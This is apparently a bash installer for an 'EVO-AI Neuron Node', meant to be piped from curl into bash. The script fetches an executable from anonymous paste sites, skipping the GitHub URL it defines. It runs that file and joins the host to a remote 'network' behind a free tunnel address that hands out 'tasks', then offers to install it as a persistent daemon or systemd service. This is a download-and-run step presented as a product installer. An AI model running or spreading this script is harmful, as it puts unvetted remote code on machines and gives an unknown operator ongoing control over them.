#!/bin/bash
# EVO-AI Neuron Node Installer
# curl -sSL https://get.evo-ai.ai | bash
# 或本地: bash install.sh

set -e

EVO_NETWORK="https://fwjxz-47-253-174-153.run.pinggy-free.link"
EVO_NODE_DIR="/workspace/.home/.evo-node"
EVO_BIN_DIR="/workspace/.home/.local/bin"

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║  EVO-AI Neuron Node Installer v1.0                            ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "Network: $EVO_NETWORK"
echo ""

# Detect OS
OS=$(uname -s)
ARCH=$(uname -m)

echo "[*] Detected OS: $OS / $ARCH"

# Create directories
mkdir -p "$EVO_NODE_DIR"
mkdir -p "$EVO_BIN_DIR"

# Try pip install (simplest)
if command -v pip3 > /dev/null 2>&1; then
    echo "[*] pip3 found. Installing evo-node..."
    pip3 install --user requests 2>&1 | tail -3 || true
elif command -v pip > /dev/null 2>&1; then
    echo "[*] pip found. Installing evo-node..."
    pip install --user requests 2>&1 | tail -3 || true
else
    echo "[!] pip not found. Need Python 3 with requests module"
    echo "    Install: apt-get install python3-pip (Ubuntu/Debian)"
    echo "    Or: brew install python3 (macOS)"
    exit 1
fi

# Download evo-node script
echo "[*] Downloading evo-node..."
EVO_NODE_URL="https://raw.githubusercontent.com/evo-ai/dist/main/evo-node"
# Fallback to paste service if GitHub not available
PASTE_URLS=(
    "https://dpaste.com/B955K5T3H.txt"
    "https://paste.rs/So0sC/raw"
    "http://p.ip.fi/Fl6f/raw"
)

# Try paste services
EVO_NODE_PATH="$EVO_BIN_DIR/evo-node"
INSTALLED=0

for url in "${PASTE_URLS[@]}"; do
    echo "    Trying $url ..."
    if curl -sSf --max-time 30 "$url" -o "$EVO_NODE_PATH" 2>/dev/null; then
        if [ -s "$EVO_NODE_PATH" ]; then
            chmod +x "$EVO_NODE_PATH"
            echo "    [✓] Downloaded from $url"
            INSTALLED=1
            break
        fi
    fi
done

if [ $INSTALLED -eq 0 ]; then
    echo "[!] Failed to download from paste services"
    echo "    Please install manually or check network"
    exit 1
fi

# Verify
echo ""
echo "[*] Verifying installation..."
if "$EVO_NODE_PATH" info 2>&1 | grep -q 'EVO'; then
    echo "[✓] EVO-Node installed successfully!"
else
    echo "[!] Verification failed. Try manually:"
    echo "    $EVO_NODE_PATH info"
    exit 1
fi

# Join the network
echo ""
echo "[*] Joining EVO-AI network..."
RESULT=$("$EVO_NODE_PATH" join 2>&1)
echo "$RESULT" | head -20

if echo "$RESULT" | grep -q 'success.*true\|Successfully joined'; then
    echo ""
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║  🎉 SUCCESS! You are now an EVO-AI node!                      ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Next steps:"
    echo "  • Run as daemon:  $EVO_NODE_PATH run"
    echo "  • Check status:   $EVO_NODE_PATH status"
    echo "  • View tasks:     \ $EVO_NODE_PATH tasks"
    echo ""
    echo "Optional: Install as systemd service for auto-start"
    echo "  $EVO_NODE_PATH service-install"
else
    echo "[!] Join failed. Check network connectivity."
fi
